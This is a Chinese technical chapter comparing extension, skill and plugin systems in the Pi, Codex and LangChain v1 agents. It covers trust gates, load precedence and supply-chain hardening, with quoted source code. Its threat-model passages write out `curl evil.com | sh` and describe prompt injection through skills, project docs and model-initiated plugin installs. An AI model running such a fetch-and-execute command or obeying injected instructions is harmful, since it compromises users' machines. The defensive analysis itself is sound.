## 0. 先搞清楚：这是个什么东西

你大概装过浏览器扩展。流程是这样的：打开应用商店 → 看到一个「广告拦截器」→ 点安装 → 浏览器弹一个框说「此扩展可以读取和更改你在所有网站上的数据」→ 你点了确定 → 它就开始工作了。VSCode 插件也一样，只是商店换成了 Marketplace，弹框换成了「信任此工作区吗」。

**给 agent 装插件是同一件事**：你想让 agent 多会一件事——比如会查 Jira、会按公司规范写提交信息、会在跑 `terraform apply` 之前拦一下——而你不想自己去改 agent 的源码。于是 agent 要提供一套机制，让「第三方写的一坨东西」能被找到、被加载、被执行。

这一坨东西通常包含三类内容，性质完全不同：

- **纯文本知识**：一段 Markdown，告诉模型「处理 PDF 时应该先跑 pdftotext 再看输出」。它不执行，只是塞进上下文影响模型的决策。这就是近两年冒出来的 **Skill（技能）** 格式。
- **可执行代码**：一段 TypeScript / 一个 shell 脚本 / 一个 MCP server 进程。它真的会跑。
- **配置**：声明「这个包提供了哪些工具、挂在哪些钩子上、需要哪些权限」。

围绕这三类内容，一套完整的扩展体系至少要回答五个问题：

1. **打包**：这坨东西的目录长什么样？有没有清单文件（manifest）？
2. **分发**：从哪儿下载？npm？git？私有 registry？一个官方审核过的商店？
3. **发现**：agent 启动时去哪些目录扫？全局的、项目的、包里的，扫到重名了听谁的？
4. **加载**：什么时候加载？加载失败了怎么办？能不能热重载？
5. **授信**：凭什么允许这段代码跑？谁批准？批准一次还是每次？

前四个问题，浏览器和 VSCode 都解决得不错，可以直接抄。**第五个问题不能抄**，因为 agent 插件的威胁模型跟它们不一样，而且更糟。

浏览器扩展跑在一个沙箱里，权限是**声明式**的：manifest 里写了 `"permissions": ["tabs"]`，它就只能碰 tabs，碰不了你的文件系统。VSCode 插件权限大得多（它能读写文件、能跑进程），但它至少是**你主动触发**的——你点了「格式化文档」，它才动。

Agent 插件两条都不满足。一个 agent 插件里的一行代码，或者一段 Markdown 里的一句话，都可能导致 agent 去跑 `curl evil.com | sh`。而且 agent 是**自主循环**的——你说了句「帮我把测试跑通」就去泡咖啡了，中间发生什么你不知道。更微妙的是**纯文本 Skill 一样危险**：它虽然自己不执行，但它是写给一个能执行任意命令的模型看的指令。「读一段文本」和「执行一段代码」在 agent 语境下的危害距离，比在普通软件里近得多。

所以本章真正的问题是：**在一个本来就能执行任意命令的进程里，"装一个第三方扩展"这个动作还剩下多少可以设防的地方？**

## 1. 为什么这件事很难

**发现（discovery）和显式声明（declaration）是一对反向需求。** 「把文件丢进 `~/.agent/extensions/` 就自动生效」对个人用户是最好的体验，零配置。但对团队就是灾难：你 clone 了一个仓库，仓库里带了 `.agent/extensions/backdoor.ts`，你一启动 agent 它就执行了。反过来，如果要求所有扩展都必须在 `settings.json` 里显式列出，个人用户会觉得啰嗦。三家的分歧点几乎全落在「哪些目录可以自动发现，哪些必须显式声明或额外授权」这条线上。

**加载顺序和优先级必须是确定的，而且要能被人预测。** 一个 skill 叫 `code-review`，全局有一个、项目有一个、某个 npm 包里还有一个，用哪个？「项目覆盖全局」听起来是常识，但反过来的规则也有道理：全局的是我自己审过的，项目的是仓库带来的，凭什么仓库能覆盖我？而且顺序还得跟**加载失败**的语义配合——高优先级的那个加载失败了，是回退到低优先级的，还是整个报错？

**分发渠道决定了信任的传递方式，而这条链非常长。** `npm install foo` 意味着你信任：foo 的作者、foo 的所有传递依赖的作者、npm registry 本身、以及这些包的 postinstall 脚本。agent 扩展如果走 npm，就完整继承了 npm 供应链的全部问题。走 git 好一点（至少你能 pin 到 commit sha），但也只是「你信任那个 commit 的作者」。走一个官方审核的商店最安全，但那需要有人真的去审，而且限制了生态。

**「谁批准安装」这个问题有一个反直觉的选项。** 常规答案是「用户批准」。但 agent 有个独特能力：它能理解「我现在缺一个能查 Jira 的工具」，于是它可以**主动提出**装某个插件。这在能力上很有吸引力（用户不需要知道有哪些插件存在），在安全上很吓人（模型被 prompt injection 之后，第一件事就是让你装一个后门插件）。三家里只有一家做了这件事，而且做了一堆约束。

**最后是沙箱这件事的取舍。** 理论上最优解是「扩展跑在沙箱里，权限声明式」。实际上一个本地 coding agent 的核心价值就是能调你的工具链、读你的源码、跑你的测试——你给它套一个真沙箱，它就废了一半。所以大多数实现的选择是：**不做沙箱，把力气花在别的地方**（供应链加固、加载门禁、执行时审批）。这个选择必须被明确写出来，而不是含糊过去，否则用户会误以为有一层根本不存在的保护。

## 2. Pi 的做法

### 2.1 一句话概括

Pi 把扩展、skill、prompt 模板、主题四类资源统一成「**pi package**」（本质是一个带 `pi` 字段的 npm 包），通过 `pi install npm:...` / `git:...` 分发；加载时用一个五档优先级表合并所有来源；安全上明确**不做沙箱**，只做两件事——启动时的 **Project Trust** 门禁（项目级资源必须先被信任才加载）和自身发布链路的**供应链加固**。

### 2.2 机制拆解

**包格式。** 一个 pi package 就是一个 npm 包，在 `package.json` 里加一个 `pi` 字段声明资源位置（`docs/packages.md:120`）：

```json
{
  "name": "my-package",
  "keywords": ["pi-package"],
  "pi": {
    "extensions": ["./extensions"],
    "skills": ["./skills"],
    "prompts": ["./prompts"],
    "themes": ["./themes"]
  }
}
```

没有 `pi` 字段时走约定目录：`extensions/` 收 `.ts`/`.js`，`skills/` 递归找 `SKILL.md` 文件夹，`prompts/` 收 `.md`，`themes/` 收 `.json`。数组支持 glob 和 `!` 排除。

**分发渠道有三种**（`docs/packages.md:52`）：

| 源类型 | 写法 | 落盘位置 | 更新语义 |
|---|---|---|---|
| npm | `npm:@foo/bar@1.2.3` | `~/.pi/agent/npm/`（全局）/ `.pi/npm/`（项目） | 带版本号的被 pin，`pi update --extensions` 跳过 |
| git | `git:github.com/user/repo@v1`、`ssh://...` | `~/.pi/agent/git/<host>/<path>` | ref 是 pin 的；update 只把 clone 对齐到配置的 ref，不会自动升到新 ref |
| 本地路径 | `/abs/path`、`./rel/path` | 不拷贝，直接引用 | 无 |

配套 CLI：`pi install/remove/list`，`pi update --extensions`（只更新包）/ `--all` / `--self`，`pi config`（图形化启用禁用单个资源，Tab 切全局/项目），以及 `pi -e npm:@foo/bar` 装到临时目录只用这一次。npm 上用 `pi-package` 关键词做发现，`pi.dev/packages` 画廊按这个关键词抓包，`pi` 字段里还能放 `video` / `image` 做预览。

**发现路径。** 扩展只有两个自动发现目录：`~/.pi/agent/extensions/`（全局）和 `.pi/extensions/`（项目，需信任）。Skill 的发现路径则长得多——这是因为 Pi 明确要**复用别家 harness 的 skill 目录**：

| 来源 | 路径 | 条件 |
|---|---|---|
| 全局 | `~/.pi/agent/skills/` | 总是 |
| 全局 | `~/.agents/skills/` | 总是（跨 harness 共享约定） |
| 项目 | `.pi/skills/` | 项目被信任后 |
| 项目 | `.agents/skills/`，从 cwd 沿祖先目录一路向上到 git root（不在仓库里则到文件系统根） | 项目被信任后 |
| 包 | 包内 `skills/` 目录或 `package.json` 的 `pi.skills` | 随包 |
| 设置 | `settings.json` 的 `skills` 数组（文件或目录） | 总是 |
| CLI | `--skill <path>`，可重复 | 总是，**即使加了 `--no-skills` 也仍然加载** |
| 扩展 | `resources_discover` 事件返回 `skillPaths` | 扩展决定 |

发现规则有个细节差异：`~/.pi/agent/skills/` 和 `.pi/skills/` 的**根级 `.md` 文件**会被当成独立 skill；而 `~/.agents/skills/` 和项目 `.agents/skills/` 的根级 `.md` 被忽略，只认含 `SKILL.md` 的目录。这是为了不跟别家 harness 的目录约定打架。

跨 harness 复用写法就是往设置里加路径（`docs/skills.md:45`）：

```json
{ "skills": ["~/.claude/skills", "~/.codex/skills"] }
```

Pi 声明实现 [Agent Skills 标准](https://agentskills.io/specification)，但**故意放宽一条**：标准要求 `name` 必须等于父目录名，Pi 不要求，理由写在文档里——「that standard requirement is suboptimal for shared skill directories used across multiple agent harnesses」（`docs/skills.md:7`）。也就是说，为了让同一个 skill 目录能被多个 agent 共用，它选择了违反标准。大部分校验失败只 warn 不阻断，唯一硬性要求是 `description` 必须存在。

**Project Trust。** 这是 Pi 唯一的加载门禁。触发条件是「当前目录下存在需要信任的项目资源」，判定清单硬编码在 `trust-manager.ts`：`.pi/settings.json`、`.pi/{extensions,skills,prompts,themes}`、`.pi/SYSTEM.md`、`.pi/APPEND_SYSTEM.md`，以及 cwd 或任一祖先目录的 `.agents/skills`。一个空的 `.pi` 目录不算。

决策存在 `~/.pi/agent/trust.json`，按规范化路径存，查找时**从 cwd 向上找最近的一条**——所以「信任父目录」会让所有子目录一起生效。默认策略 `defaultProjectTrust` 是 `"ask"`，可改成 `"always"` / `"never"`。

三个必须记住的边界：

- **非交互模式（`-p` / `--mode json` / `--mode rpc`）不弹提示**。没有已保存决策时，`"ask"` 和 `"never"` 都直接**不加载**项目资源，只有 `"always"` 会信任。CI 里默默少了一堆 skill，多半是这个原因。
- **`AGENTS.md` / `AGENTS.override.md` / `CLAUDE.md` 不受 trust 限制，始终加载**（除非整体关掉 context 加载）。也就是说，Project Trust 拦得住项目扩展执行，拦不住项目文档往模型上下文里塞话。文档自己承认了这点：prompt injection「is expected local-agent risk and cannot be reliably prevented by pi」（`docs/security.md:37`）。
- `--approve`/`-a` 和 `--no-approve`/`-na` 可以为单次运行覆盖决策（`src/cli/args.ts:196`）。

信任解析之前，Pi 只加载 context 文件、用户/全局扩展、和 CLI `-e` 扩展。这些先加载的扩展可以处理 `project_trust` 事件抢先做决定——第一个返回 yes/no 的赢，返回 `"undecided"` 则交回给内置流程。

### 2.3 源码

优先级规则是一个五行的排序函数，值得完整看：

`packages/coding-agent/src/core/package-manager.ts:178`

```typescript
function resourcePrecedenceRank(m: PathMetadata): number {
	if (m.origin === "package") return 4;
	const scopeBase = m.scope === "project" ? 0 : 2;
	return scopeBase + (m.source === "local" ? 0 : 1);
}
```

展开成表就是（数字小的赢）：

| rank | 含义 | 典型路径 |
|---|---|---|
| 0 | 项目 + 显式声明 | `.pi/settings.json` 里 `skills`/`extensions` 数组列出的路径 |
| 1 | 项目 + 自动发现 | `.pi/skills/`、`.agents/skills/` |
| 2 | 用户 + 显式声明 | `~/.pi/agent/settings.json` 里的数组（比如 `~/.claude/skills`） |
| 3 | 用户 + 自动发现 | `~/.pi/agent/skills/`、`~/.agents/skills/` |
| 4 | 包 | 任何 pi package 提供的资源 |

有两个判断值得点出来。**第一，「显式声明」优先于「自动发现」**——你在设置里手写的路径压过随手丢进目录的文件，这符合直觉。**第二，包排在最后，无论包是全局装的还是项目装的**。也就是说本地文件永远压过安装来的包，装一个包不会悄悄改掉你自己写的同名 skill。

排序发生在最后收敛的时候，收敛前先按路径去重（先到先得），排完再按 canonical path 去一次符号链接重复：

`packages/coding-agent/src/core/package-manager.ts:2533`

```typescript
	private addResource(
		map: Map<string, { metadata: PathMetadata; enabled: boolean }>,
		path: string,
		metadata: PathMetadata,
		enabled: boolean,
	): void {
		if (!path) return;
		if (!map.has(path)) {
			map.set(path, { metadata, enabled });
		}
	}
```

`if (!map.has(path))` 是「第一个写入的元数据赢」。配合 `resolve()` 里的收集顺序（`package-manager.ts:890` 注释写了 `project first so cwd resources win collisions`：先项目包再全局包，再项目设置数组再全局设置数组，最后自动发现目录），同一路径从多个来源出现时保留的是**优先级更高那次的元数据**。名字冲突（不同路径同名 skill）则在 `skills.ts` 里单独处理：保留先遇到的，其余记一条 `collision` 诊断。

信任判定的入口只有 100 行不到，逻辑很直白：

`packages/coding-agent/src/core/project-trust.ts:46`

```typescript
export async function resolveProjectTrusted(options: ResolveProjectTrustedOptions): Promise<boolean> {
	if (options.trustOverride !== undefined) {
		return options.trustOverride;
	}
	if (!hasTrustRequiringProjectResources(options.cwd)) {
		return true;
	}

	if (options.extensionsResult) {
		const { result, errors } = await emitProjectTrustEvent(/* ... */);
		if (result) {
			const trusted = result.trusted === "yes";
			if (result.remember === true) {
				options.trustStore.set(options.cwd, trusted);
			}
			return trusted;
		}
	}

	const decision = options.trustStore.get(options.cwd);
	if (decision !== null) {
		return decision;
	}

	switch (options.defaultProjectTrust ?? "ask") {
		case "always": return true;
		case "never": return false;
		case "ask": break;
	}

	if (!options.projectTrustContext.hasUI) {
		return false;
	}
	// ... 弹选择框，保存决策
}
```

优先级链是：**CLI 覆盖 → 无可信资源则直接放行 → 扩展抢答 → 存储的决策 → 全局默认 → 弹框（无 UI 则 fail-closed 返回 false）**。最后那个 `if (!hasUI) return false` 就是「非交互模式不弹提示」的实现，而且方向是保守的：拿不准就不加载。

扩展的实际加载则毫无仪式感，`jiti` import 一下，拿默认导出当工厂函数调用：

`packages/coding-agent/src/core/extensions/loader.ts:490`

```typescript
async function loadExtension(
	extensionPath: string, cwd: string, eventBus: EventBus,
	runtime: ExtensionRuntime, cacheToken?: ExtensionCacheToken,
): Promise<{ extension: Extension | null; error: string | null }> {
	const resolvedPath = resolvePath(extensionPath, cwd, { normalizeUnicodeSpaces: true });
	try {
		const factory = await loadExtensionModule(resolvedPath, cacheToken);
		if (!factory) {
			return { extension: null, error: `Extension does not export a valid factory function: ${extensionPath}` };
		}
		const extension = createExtension(extensionPath, resolvedPath);
		const api = createExtensionAPI(extension, runtime, cwd, eventBus);
		await factory(api);
		return { extension, error: null };
	} catch (err) {
		const message = err instanceof Error ? err.message : String(err);
		return { extension: null, error: `Failed to load extension: ${message}` };
	}
}
```

单个扩展加载失败被 catch 成一条 error 记录，不影响其余扩展——**加载是 fail-soft 的**，跟 trust 判定的 fail-closed 正好相反，这两处的方向选得都对。

**供应链加固：不做沙箱，那就把力气花在别处。** Pi 的 README 有一整节叫 Supply-chain hardening，开头一句是「We treat npm dependency changes as reviewed code changes」。具体措施：

`.npmrc`（仓库根）

```
save-exact=true
min-release-age=2
```

`min-release-age=2` 是说 npm 解析依赖时**跳过发布不足 2 天的版本**——针对的正是「维护者账号被盗、恶意版本发布后几小时内被大量拉取」这类攻击。加上 `save-exact` 把直接依赖 pin 成精确版本。

其余措施（`README.md:76-88`）：`package-lock.json` 作为唯一真相，pre-commit 拦截意外的 lockfile 提交（除非 `PI_ALLOW_LOCKFILE_CHANGE=1`）；发布的 CLI 包内含从根 lockfile 生成的 `npm-shrinkwrap.json`，把传递依赖也 pin 给 npm 用户；shrinkwrap 生成有一份**依赖生命周期脚本的白名单**，新引入带 lifecycle script 的依赖会让检查失败直到人工审过；本地发布、文档里的安装命令、`pi update --self` 都尽量带 `--ignore-scripts`；GitHub release 附 `SHA256SUMS` 和源码归档，可以用同一个脚本复现官方二进制。

CI 侧有一个每天跑的定时任务：

`.github/workflows/npm-audit.yml`

```yaml
      - name: Install dependencies without lifecycle scripts
        run: npm ci --ignore-scripts --no-audit --no-fund
      - name: Audit production vulnerabilities
        run: npm audit --omit=dev --audit-level=moderate
      - name: Verify registry signatures
        run: npm audit signatures --omit=dev
```

`npm audit signatures` 校验 registry 签名，能发现 tarball 被篡改。

这套东西保护的是**「你装的 pi 本身是干净的」**，保护不了**「你装的第三方 pi package 是干净的」**——后者文档直接放弃，写在 `docs/packages.md:20` 的加粗警告里：「Pi packages run with full system access. Extensions execute arbitrary code, and skills can instruct the model to perform any action including running executables. Review source code before installing third-party packages.」

### 2.4 代价与适用边界

**代价一：没有沙箱，而且明说不打算做。** `docs/security.md:35` 的原文值得引：「A partial in-process sandbox would be easy to misunderstand as a security boundary while still depending on the host shell, filesystem, package managers, credentials, and extension code. Real isolation needs to come from the operating system or a virtualization/container boundary.」这是一个诚实但把责任推给用户的选择——用户需要自己套容器/micro-VM，文档给了 `docs/containerization.md` 作为指引。对个人开发者在自己项目里用，这没问题；对「让实习生装个社区插件跑跑」的场景，防护为零。

**代价二：Project Trust 是一次性的、目录粒度的。** 信任一个目录之后，该目录下所有项目资源全部放行，且默认永久保存。仓库后续新增一个 `.pi/extensions/x.ts` 不会再问一次。「信任父目录」这个选项更是一键放行整个 `~/code`。

**代价三：非交互模式的沉默降级容易踩。** 交互跑好好的，CI 里同一条命令少加载了项目 skill，还不报错。要在 CI 里保持一致，必须显式 `-a` 或者把 `defaultProjectTrust` 设成 `"always"`——而后者等于全局关掉这道门。

**适用边界**：单人或小团队、扩展主要是自己写的或来自少数几个信得过的作者、运行环境本来就是开发者自己的机器。需要给不特定用户分发扩展、或者需要「即使装了恶意插件也不至于丢 SSH key」这种保证的场景，Pi 这套不够。

## 3. Codex 的做法

### 3.1 一句话概括

Codex 把扩展做成了**有清单、有商店、有版本、有企业策略**的完整发行体系：插件是一个带 `plugin.json`（Agent Plugins v1 schema）的目录，通过 **marketplace**（本地目录 / git 仓库 / npm 包）分发和安装；skill 有四级作用域（Repo/User/System/Admin）和明确的优先级；企业可以用 `requirements.toml` 限死允许的 marketplace 源；而且**模型自己可以调工具请求安装插件**，最终由用户在 UI 上点确认。

### 3.2 机制拆解

**插件清单。** 一个插件是一个目录，根下有清单文件。查找顺序有讲究：

`codex-rs/utils/plugins/src/plugin_namespace.rs:41`

```rust
pub fn find_plugin_manifest_path(plugin_root: &Path) -> Option<PathBuf> {
    let agent_manifest_path = plugin_root.join(AGENT_PLUGIN_MANIFEST_RELATIVE_PATH); // "plugin.json"
    match std::fs::symlink_metadata(&agent_manifest_path) {
        Ok(metadata) if metadata.file_type().is_symlink() || !metadata.file_type().is_file() => {
            return None;
        }
        Ok(_) => {
            if std::fs::read_to_string(&agent_manifest_path)
                .ok()
                .is_some_and(|contents| {
                    agent_plugin_schema_status(&contents) != AgentPluginSchemaStatus::Unrelated
                })
            {
                return Some(agent_manifest_path);
            }
        }
        Err(err) if err.kind() == std::io::ErrorKind::NotFound => {}
        Err(_) => return None,
    }

    DISCOVERABLE_PLUGIN_MANIFEST_PATHS
        .iter()
        .map(|relative_path| plugin_root.join(relative_path))
        .find(|manifest_path| manifest_path.is_file())
}
```

三个细节：

1. 优先找根目录的 `plugin.json`，但**只有当它的 `$schema` 指向 `https://agent-plugins.org/schemas/...` 时才算数**（`agent_plugin_schema_status`）。这样一个普通 npm 包根目录里恰好有个 `plugin.json` 不会被误认。
2. **符号链接直接拒绝**（`is_symlink()` → `return None`）。这是防目录穿越/指向仓库外文件的一道硬门。
3. 回退清单是 `DISCOVERABLE_PLUGIN_MANIFEST_PATHS`（`exec-server-protocol/src/protocol.rs:46`）：`.codex-plugin/plugin.json`、`.claude-plugin/plugin.json`、`.cursor-plugin/plugin.json`。**Codex 直接读 Claude Code 和 Cursor 的插件清单**——跟 Pi 读 `~/.claude/skills` 是同一种互操作动机，但走的是 manifest 层而不是目录层。找到 Agent Plugin 格式清单时，还会把 `.codex-plugin/plugin.json` 当 overlay 叠加上去（`core-plugins/src/manifest.rs:170`），让同一个包能给不同 harness 提供差异化配置。

**npm 源的加固值得单独看**，因为它跟 Pi 的选择正好互补：

`codex-rs/core-plugins/src/npm_source.rs:79`

```rust
fn pack_npm_package(
    destination: &Path, package: &str, version: Option<&str>,
    registry: Option<&str>, npm_command: &OsStr,
) -> Result<(), String> {
    let package_spec = version.map_or_else(
        || package.to_string(),
        |version| format!("{package}@{version}"),
    );
    let mut command = Command::new(npm_command);
    command
        .current_dir(destination)
        .arg("pack")
        .arg("--ignore-scripts")
        .arg("--pack-destination")
        .arg(destination);
    if let Some(registry) = registry {
        command.arg("--registry").arg(registry);
    }
    command.arg("--").arg(package_spec);
    // ...
}
```

用的是 `npm pack` 而**不是** `npm install`——只把 tarball 下下来解开，不装依赖、不跑脚本。配套还有三道限制（`npm_source.rs:12-14, 145-172`）：归档最大 50 MB、解压后最大 250 MB（防 zip bomb）、解压后校验 `package.json` 里的 `name` 必须等于请求的包名（防 registry 重定向到别的包）。

对比一下：Pi 的 `pi install npm:...` 是真的跑 `npm install`（因为 Pi 扩展是 TypeScript，需要运行时依赖），所以它必须在别处（自身 CI、`--ignore-scripts`、shrinkwrap）加固；Codex 的插件不带 JS 运行时依赖，所以可以直接用 `npm pack` 这条更窄的路。**两家的加固手段差异，根源是扩展的执行形态不同。**

**模型主动请求装插件。** 这是三家里独一份的设计。两个工具组成一对：

`codex-rs/core/src/tools/handlers/list_available_plugins_to_install_spec.rs:8`（工具描述原文）

> - The user explicitly asks to use a specific plugin or connector that is not already available in the current context or active `tools` list.
> - `tool_search` is not available, or it has already been called and did not find or make the requested tool callable.

`request_plugin_install` 的描述更严：

> Use this tool only after `list_available_plugins_to_install` returns a plugin or connector that exactly matches the user's explicit request.
> Do not use it for adjacent capabilities, broad recommendations, or tools that merely seem useful.

关键在于实现：这个工具**自己不装任何东西**，它发一个 MCP elicitation 请求给客户端，等用户点确认，然后去**验证**装没装成：

逐层拆开这个设计里的约束：

1. **模型只能提名，不能安装。** 装的动作发生在客户端（IDE / app-server），核心只发起一个 elicitation。
2. **提名范围是封闭的。** `tool_id` 必须匹配 `list_available_plugins_to_install` 返回过的条目，否则直接 `RespondToModel` 报错。而那个列表本身又受 `TOOL_SUGGEST_DISCOVERABLE_PLUGIN_ALLOWLIST` 限制——一个 30 项的硬编码白名单（`discoverable.rs:17`），全是 `github@openai-curated`、`slack@openai-curated`、`figma@openai-curated` 这类官方策展条目。**模型没法提名任意 npm 包。**
3. **必须给理由。** `suggest_reason` 是必填且不能为空，会展示给用户。
4. **不允许并行调用。** `supports_parallel_tool_calls() -> false`，工具描述里还大写强调了一遍——避免一次弹一堆授权框把用户点麻。
5. **用户可以永久拒绝。** 拒绝时带上特定 meta 就会写进配置的 `tool_suggest.disabled_tools`，以后不再提名这个。
6. **TUI 里直接禁用。** `if turn.app_server_client_name == Some("codex-tui") { return Err(...) }`——纯终端环境下这条路是关的，因为纯文本 UI 里做这种授权交互风险太高。
7. **结果要验证。** `verified_plugin_install_completed` 回头查 marketplace 列表里这个插件的 `installed` 标志，而不是相信 elicitation 的返回值。

即便有这七层，这仍然是一条**从模型输出通向本机软件安装**的路径。一次成功的 prompt injection 让模型说服用户点「同意」，收益比让它跑一条 `curl | sh` 大得多——后者用户能在审批框里看见完整命令，前者用户看见的是「安装 GitHub 插件，理由：你需要查 issue」。白名单是这里最关键的一道防线，也是唯一真正硬的那道。

### 3.3 代价与适用边界

**代价一：复杂度不在一个量级。** `core-plugins` 一个 crate 就有 3.3 万行（含测试），概念栈是「requirements → config layer → marketplace 配置 → marketplace 清单 → plugin 清单 → plugin store 版本 → 启用开关 → skill config rules」八层。要搞清楚「为什么我这个 skill 没生效」，得逐层排查。Pi 的同一问题在一个 5 行的 rank 函数里就能看完。

**代价二：可信度高度依赖 OpenAI 自己的策展。** `TOOL_SUGGEST_DISCOVERABLE_PLUGIN_ALLOWLIST` 是硬编码的官方名单，`script_attribution` 只信任「OpenAI-shipped synced code」和服务端安装的全局远程插件。**这套体系里最安全的部分恰恰是最不开放的部分**——第三方 git marketplace 装的插件既不在提名白名单里，也拿不到可信归因。生态开放度和安全性在这里是直接矛盾的，Codex 选了安全。

**代价三：模型发起安装这条路的风险不能被工程手段完全消掉。** 前面列的七层约束都是在收窄，但只要这条通路存在，用户就多了一个「被说服点确认」的攻击面。禁用 TUI 那一条其实是一个信号：设计者自己也认为这个交互在低保真 UI 下不够安全。

**代价四：远程 skill 是半成品。** `core-skills/src/remote.rs:14` 的注释原文：「Low-level client for the remote skill API. This is intentionally kept around for future wiring, but it is not used yet by any active product surface.」代码里有 `RemoteSkillScope::{WorkspaceShared, AllShared, Personal, Example}` 和下载逻辑（落到 `$CODEX_HOME/skills/<skill_id>`），但目前没有产品面在用。读源码时容易把它当成已上线能力。

**适用边界**：企业部署、需要中心化管控扩展来源、需要给非工程用户提供「像装 App 一样装插件」体验的场景。个人开发者想快速写个小扩展自用，这套流程的重量明显过剩——写个 hook 脚本比走一遍 plugin manifest + marketplace 快得多。

## 4. LangChain v1 的做法

### 4.1 一句话概括

**没有插件系统，也没有 skill 概念。** LangChain v1 的「扩展」就是**一个 Python 包**：`pip install` 装上，`import` 进来，当成普通对象用。没有加载器、没有发现机制、没有信任层、没有清单格式——分发交给 PyPI，加载交给 Python 的 import 机制，信任交给「你自己决定 pip install 什么」。

### 4.2 机制拆解

**扩展 = PyPI 包。** 官方维护的集成包放在 `libs/partners/` 下，当前这个快照里是 15 个：anthropic、chroma、deepseek、exa、fireworks、groq、huggingface、mistralai、nomic、ollama、openai、openrouter、perplexity、qdrant、xai。

`libs/README.md` 里明确说了这只是一小部分，其余已经迁走：

> Most integrations have been moved to their own repositories for improved versioning, dependency management, collaboration, and testing. This includes packages from popular providers such as [Google](https://github.com/langchain-ai/langchain-google) and [AWS](https://github.com/langchain-ai/langchain-aws). Many third-party providers maintain their own LangChain integration packages.

这是 LangChain 生态最重要的一次结构演进：早期所有集成都堆在 `langchain-community` 这一个包里，装一个包拿到全世界；后来拆成一个个独立包，各自版本、各自 CI、各自维护者。`langchain-community` 在这个 monorepo 里已经不存在源码了，只以**可选依赖**的形式残留：

`libs/langchain_v1/pyproject.toml:34`

```toml
[project.optional-dependencies]
community = ["langchain-community"]
anthropic = ["langchain-anthropic"]
openai = ["langchain-openai"]
azure-ai = ["langchain-azure-ai"]
#cohere = ["langchain-cohere"]
google-vertexai = ["langchain-google-vertexai"]
google-genai = ["langchain-google-genai"]
fireworks = ["langchain-fireworks"]
ollama = ["langchain-ollama"]
...
```

`pip install "langchain[anthropic]"` 就是这套「分发机制」的全部——它是 PEP 508 extras，不是 LangChain 发明的任何东西。

**Middleware 就是普通类。** 上一章讲的所有中间件，在分发层面没有任何特殊待遇：

`libs/langchain_v1/langchain/agents/middleware/__init__.py:1`

```python
"""Entrypoint to using [middleware](https://docs.langchain.com/oss/python/langchain/middleware) plugins with [Agents](https://docs.langchain.com/oss/python/langchain/agents)."""  # noqa: E501
```

**这句 docstring 里的 "plugins" 是整个 `langchain_v1/langchain/` 目录下唯一出现的 plugin 相关字样**（`grep -rn "entry_points\|importlib.metadata\|pkg_resources\|load_plugin\|plugin"` 只命中这一行）。没有 `entry_points` 注册、没有 `importlib.metadata` 扫描、没有插件目录。用法就是：

```python
from langchain.agents.middleware import HumanInTheLoopMiddleware
from my_company_pkg import AuditMiddleware   # 自己或第三方的包，一样地 import

agent = create_agent(model, tools, middleware=[HumanInTheLoopMiddleware(...), AuditMiddleware()])
```

**唯一的动态加载**在 `init_chat_model` 里，而且它只是一个 provider 名 → 包名的静态映射加上友好报错：

`libs/langchain_v1/langchain/chat_models/base.py:123`

```python
def _import_module(module: str, class_name: str) -> ModuleType:
    """Import a module by name.
    ...
    Raises:
        ImportError: If the module cannot be imported, with a message suggesting
            the pip package to install.
    """
    try:
        return importlib.import_module(module)
    except ImportError as e:
        # Extract package name from module path (e.g., "langchain_azure_ai.chat_models"
        # becomes "langchain-azure-ai")
        pkg = module.split(".", maxsplit=1)[0].replace("_", "-")
        msg = (
            f"Initializing {class_name} requires the {pkg} package. Please install it "
            f"with `pip install {pkg}`"
        )
        raise ImportError(msg) from e
```

注意这里的边界：`_BUILTIN_PROVIDERS` 是一个**硬编码的字典**，不在字典里的 provider 不会被自动推断（文档注释里写了「If a provider is not in this dict, it can still be used with `init_chat_model` as long as its integration package is installed, but the provider key will not be inferred from the model name and must be specified explicitly」）。也就是说，连这唯一一处「动态」也是闭合的——它不会去扫描系统里装了哪些 `langchain-*` 包，只会按名字直接 `import_module` 一个写死的路径。

还有一处历史兼容的特判：`ollama` 这个 provider 如果 `langchain-ollama` 没装，会回退去试 `langchain_community.chat_models`（`base.py:184`）。这是拆包过程留下的疤。

**没有 skill 概念。** 在 `libs/langchain_v1/langchain/` 下 case-insensitive 搜 `skill`，零命中。LangChain 没有「渐进式披露的能力包」这个抽象——如果你要类似效果，自己写：把 skill 描述拼进 system prompt（用 `SystemPromptMiddleware` 之类），把 `SKILL.md` 的读取做成一个 tool。框架不会帮你做发现、校验、去重、冲突处理中的任何一步。

**MCP 也是包。** `langchain-mcp-adapters` 这类第三方包提供把 MCP server 的工具转成 LangChain tool 的适配器，它在 PyPI 上跟别的包没有任何区别，LangChain 核心不认识它、不为它开口子。

### 4.3 代价与适用边界

**这是最简单的答案，也是最没有防护的答案。** `pip install` 一个包意味着运行它的 `setup.py`（如果是 sdist）、把它的代码放进你的 import path、然后你 `import` 它时执行模块顶层代码。整条链路上 LangChain 一个字都插不上。没有 trust prompt，没有 allowlist，没有 sandbox，没有清单，没有优先级表——因为根本没有「加载扩展」这个动作。

**但这个选择在定位上是自洽的**，甚至是唯一合理的。回到 `_STYLE.md` 里那条轴：**LangChain 是框架，用户是开发者；Pi 和 Codex 是产品，用户是终端用户。**

一个正在写 Python 代码的开发者，本来就在 `pip install` 各种东西、本来就要 review requirements.txt、本来就有 CI 和依赖扫描。你给他再发明一层「LangChain 插件信任模型」，他会问：为什么 `langchain-foo` 需要额外授权而 `requests` 不需要？这一层不会增加安全性，只会增加一个需要维护的假边界。Python 生态已经有 pip-audit、Dependabot、私有 index、`--require-hashes` 这些工具，重复造一套只会更差。

反过来，Pi 和 Codex 的用户可能只是「想装个能查 Jira 的东西」，他不会 review TypeScript，他期待有人替他把关。所以他们**必须**造一层。

**代价**在别处：因为没有统一格式，LangChain 生态里没有「skill 市场」「中间件商店」这种东西，好用的东西靠 README 和博客传播；因为没有加载器，也就没有「装了但没生效」的调试工具——但也没有这类 bug。**没有机制就没有机制的故障模式**，这本身是一种收益。

**适用边界**：你在写代码、你控制部署环境、你的依赖清单是被 review 的。如果你在拿 LangChain 做一个**面向终端用户的产品**，并且想让用户自己装扩展，那这一层你得自己从头造——框架什么都不给你。

### 5.4 Skills 这个格式的三种态度

这是本章最值得单独总结的一格。

**Pi：把 Skills 当作跨 harness 的公共标准来实现。** 声明实现 agentskills.io 规范，同时明确为了共享目录**故意违反其中一条**（name 必须等于目录名）。配置里加两行就能直接吃 `~/.claude/skills` 和 `~/.codex/skills`。加载路径列了 7 种来源，`~/.agents/skills` 作为跨 harness 用户目录。态度是：**这是一个生态标准，我们要最大程度互通。**

